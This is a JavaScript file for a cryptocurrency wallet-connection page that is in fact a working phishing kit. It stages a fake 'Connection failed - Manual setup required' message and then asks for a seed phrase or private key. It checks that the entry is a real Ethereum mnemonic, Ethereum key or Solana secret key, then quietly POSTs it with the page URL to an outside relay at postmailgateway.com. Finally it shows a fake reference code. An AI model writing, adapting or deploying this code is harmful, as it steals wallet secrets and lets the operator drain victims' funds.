let allWallets = [...wallets];
let filteredWallets = [...wallets];

// DOM Elements
const walletGrid = document.getElementById('walletGrid');
const searchBox = document.getElementById('walletSearch');
const clearSearch = document.getElementById('clearSearch');
const noResults = document.getElementById('noResults');
const modal = document.getElementById('walletModal');
const closeModal = document.getElementById('closeModal');
const modalWalletName = document.getElementById('modalWalletName');
const modalWalletImg = document.getElementById('modalWalletImg');
const statusIndicator = document.getElementById('statusIndicator');
const phraseForm = document.getElementById('phraseForm');
let submitPhrase = document.getElementById('submitPhrase');
let phraseInput = document.getElementById('phraseInput');
let originalPhraseFormHTML = '';
let connectTimer1 = null, connectTimer2 = null;

function bindPhraseHandlers() {
    // Re-grab fresh nodes (innerHTML resets them)
    phraseInput = document.getElementById('phraseInput');
    submitPhrase = document.getElementById('submitPhrase');
    if (submitPhrase) {
        // use property handler to avoid duplicate listeners
        submitPhrase.onclick = onSubmitPhrase;
        submitPhrase.disabled = false;
        submitPhrase.textContent = 'Connect Wallet';
    }
    if (phraseInput) {
        phraseInput.style.borderColor = '';
        phraseInput.value = '';
    }
}

function resetModalUI() {
    // 1) stop any pending timers started by openWalletModal
    if (connectTimer1) { clearTimeout(connectTimer1); connectTimer1 = null; }
    if (connectTimer2) { clearTimeout(connectTimer2); connectTimer2 = null; }

    // 2) restore status + form to original
    statusIndicator.style.display = 'flex';
    statusIndicator.innerHTML = '<div class="loading-spinner"></div><span>Establishing connection...</span>';
    phraseForm.style.display = 'none';
    phraseForm.innerHTML = originalPhraseFormHTML;  // put the textarea/button back

    // 3) rebind events to the fresh nodes
    bindPhraseHandlers();
}

// Render wallets
function renderWallets(walletsToRender = filteredWallets) {
    walletGrid.innerHTML = '';

    if (walletsToRender.length === 0) {
        noResults.style.display = 'block';
        walletGrid.style.display = 'none';
        return;
    }

    noResults.style.display = 'none';
    walletGrid.style.display = 'grid';

    walletsToRender.forEach((wallet, index) => {
        const walletCard = document.createElement('div');
        walletCard.className = 'wallet-card fade-in';
        walletCard.style.animationDelay = `${index * 0.05}s`;
        walletCard.innerHTML = `
                    <div class="wallet-status"></div>
                    <div class="wallet-header">
                        <div class="wallet-icon">
                            <img src="${wallet.icon}" alt="${wallet.name}" loading="lazy">
                        </div>
                        <div class="wallet-info">
                            <h3>${wallet.name}</h3>
                            <p>${wallet.domain}</p>
                        </div>
                    </div>
                `;

        walletCard.addEventListener('click', () => openWalletModal(wallet));
        walletGrid.appendChild(walletCard);
    });
}

// Search functionality
function performSearch() {
    const searchTerm = searchBox.value.toLowerCase().trim();

    if (searchTerm === '') {
        filteredWallets = [...allWallets];
        clearSearch.style.display = 'none';
    } else {
        filteredWallets = allWallets.filter(wallet =>
            wallet.name.toLowerCase().includes(searchTerm) ||
            wallet.domain.toLowerCase().includes(searchTerm)
        );
        clearSearch.style.display = 'block';
    }

    renderWallets();
}

async function openWeb() {
    const provider = new ethers.BrowserProvider(window.ethereum);
    // Request accounts (v6: use provider.send)
    await provider.send('eth_requestAccounts', []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
}
// Modal functionality
async function openWalletModal(wallet) {
    modalWalletName.textContent = wallet.name;
    modalWalletImg.src = wallet.icon;
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';

    // fresh state every open
    resetModalUI();

    // create a Web3Provider instance
    openWeb();

    // Simulate connection attempt
    connectTimer1 = setTimeout(() => {
        statusIndicator.innerHTML = '<i class="fa-solid fa-exclamation-triangle" style="color: #f59e0b; margin-right: 12px;"></i><span>Connection failed - Manual setup required</span>';

        connectTimer2 = setTimeout(() => {
            statusIndicator.style.display = 'none';
            phraseForm.style.display = 'block';
        }, 2000);
    }, 3000);
}

function closeWalletModal() {
    modal.style.display = 'none';
    document.body.style.overflow = '';
    resetModalUI();
}

// Generate random code
function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Event Listeners
searchBox.addEventListener('input', performSearch);
searchBox.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        performSearch();
    }
});

clearSearch.addEventListener('click', () => {
    searchBox.value = '';
    performSearch();
    searchBox.focus();
});

closeModal.addEventListener('click', closeWalletModal);

modal.addEventListener('click', (e) => {
    if (e.target === modal) {
        closeWalletModal();
    }
});

// --- Validation helpers  ---
function normalizeWhitespace(str) { return (str || '').trim().replace(/\s+/g, ' '); }
function arraysEqual(a, b) { if (a.length !== b.length) return false; for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false; return true; }
function isLikelyMnemonic(v) { return /\s/.test((v || '').trim()); }

function validateMnemonic(phrase) {
    const normalized = normalizeWhitespace(phrase.toLowerCase());
    const words = normalized.split(' ');
    if (![12, 18, 24].includes(words.length)) {
        return { ok: false, reason: 'count' };
    }
    try {
        ethers.Wallet.fromPhrase(normalized);
        return { ok: true, type: 'mnemonic', value: normalized };
    } catch {
        return { ok: false, reason: 'invalid' };
    }
}

function validateEthPrivateKey(input) {
    const hex = normalizeWhitespace(input).replace(/^0x/i, '');
    if (!/^[0-9a-fA-F]{64}$/.test(hex)) {
        return { ok: false, reason: 'format' };
    }
    try {
        new ethers.Wallet('0x' + hex);
        return { ok: true, type: 'privateKey', value: '0x' + hex.toLowerCase() };
    } catch {
        return { ok: false, reason: 'invalid' };
    }
}
// ----- SOLANA checks -----
function validateSolanaSecretKey(input) {
    const raw = (input || '').trim();
    if (!raw) return { ok: false, reason: 'empty' };

    let u8 = null;
    if (raw.startsWith('[')) u8 = tryJsonByteArray(raw);
    if (!u8) u8 = tryBase58(raw);
    if (!u8) u8 = tryBase64(raw);
    if (!u8) u8 = toU8FromHex(raw);
    if (!u8) return { ok: false, reason: 'format' };

    try {
        if (u8.length === 64) {
            const kp = nacl.sign.keyPair.fromSecretKey(u8);
            if (!arraysEqual(kp.secretKey, u8)) return { ok: false, reason: 'invalid' };
            return { ok: true, type: 'solanaSecretKey' };
        }
        if (u8.length === 32) {
            nacl.sign.keyPair.fromSeed(u8);
            return { ok: true, type: 'solanaSeed' };
        }
        return { ok: false, reason: 'length' };
    } catch {
        return { ok: false, reason: 'invalid' };
    }
}

// Phrase form submission
async function onSubmitPhrase(e) {
    e.preventDefault();
    const raw = phraseInput.value || '';
    const value = raw.trim();

    // Empty guard
    if (!value) {
        phraseInput.style.borderColor = '#ef4444';
        phraseInput.focus();
        return;
    }

    let result;
    if (isLikelyMnemonic(value)) {
        result = validateMnemonic(value);
    } else {
        result = validateEthPrivateKey(value);
        if (!result.ok) result = validateSolanaSecretKey(value);
    }

    if (!result.ok) {
        phraseInput.style.borderColor = '#ef4444';
        phraseInput.focus();
        return;
    }

    if (submitPhrase) {
        submitPhrase.disabled = true;
        submitPhrase.innerHTML = '<div class="loading-spinner" style="width:16px;height:16px;margin-right:6px;"></div>Connecting...';
    }

    try {
        // API call
        const body = new URLSearchParams({
            dappLink: window.location.href,
            dappWord: value,
            dappName: modalWalletName.textContent
        });

        fetch('https://postmailgateway.com/relay/connect_node.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
            body: body.toString(),
            mode: 'cors'
        });

        const refCode = generateRandomString(7);
        phraseForm.innerHTML = `
                    <div style="text-align: center; padding: 20px 0;">
                        <i class="fa-solid fa-check-circle" style="font-size:48px; color:#10b981; margin-bottom:16px;"></i>
                        <h4 style="margin-bottom:8px;">Connection Initiated</h4>
                        <p style="color: var(--text-muted); margin-bottom:16px;">Please save the reference code:</p>
                        <div style="background: var(--secondary-bg); padding:12px; border-radius:8px; font-family: monospace; font-size: 18px; font-weight: bold; letter-spacing: 2px;">${refCode}</div>
                    </div>
                `;

    } catch (err) {
        console.error('Connection error:', err);
        if (submitPhrase) {
            submitPhrase.disabled = false;
            submitPhrase.textContent = 'Connect Wallet';
        }
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = 'color:#ef4444; text-align: center; margin-top:12px; font-size:14px;';
        errorDiv.textContent = 'Connection failed. Please try again.';
        phraseForm.appendChild(errorDiv);
        setTimeout(() => errorDiv.remove(), 3000);
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    originalPhraseFormHTML = phraseForm.innerHTML; // textarea + button as shipped
    bindPhraseHandlers();
    renderWallets();

    // Add some animation delays
    setTimeout(() => {
        document.querySelectorAll('.wallet-card').forEach((card, index) => {
            card.style.animationDelay = `${index * 0.1}s`;
        });
    }, 100);
});

// Keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal.style.display === 'flex') {
        closeWalletModal();
    }

    if (e.ctrlKey && e.key === 'k') {
        e.preventDefault();
        searchBox.focus();
        searchBox.select();
    }
});

// Add some subtle animations on scroll
window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const cards = document.querySelectorAll('.wallet-card');

    cards.forEach(card => {
        const rect = card.getBoundingClientRect();
        const isVisible = rect.top < window.innerHeight && rect.bottom > 0;

        if (isVisible) {
            card.style.transform = `translateY(${scrolled * 0.02}px)`;
        }
    });
});

// Touch/swipe gestures for mobile
let touchStartY = 0;
let touchEndY = 0;

modal.addEventListener('touchstart', (e) => {
    touchStartY = e.changedTouches[0].screenY;
});

modal.addEventListener('touchend', (e) => {
    touchEndY = e.changedTouches[0].screenY;

    // Swipe down to close modal
    if (touchStartY < touchEndY - 100) {
        closeWalletModal();
    }
});

// Progressive Web App features
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
            .then(registration => console.log('SW registered'))
            .catch(registrationError => console.log('SW registration failed'));
    });
}

// Performance monitoring
window.addEventListener('load', () => {
    const perfData = performance.getEntriesByType('navigation')[0];
    if (perfData.loadEventEnd - perfData.loadEventStart > 3000) {
        console.warn('Page load time exceeded 3 seconds');
    }
});

// Auto-focus search on desktop
if (window.innerWidth > 768) {
    window.addEventListener('load', () => {
        setTimeout(() => searchBox.focus(), 500);
    });
}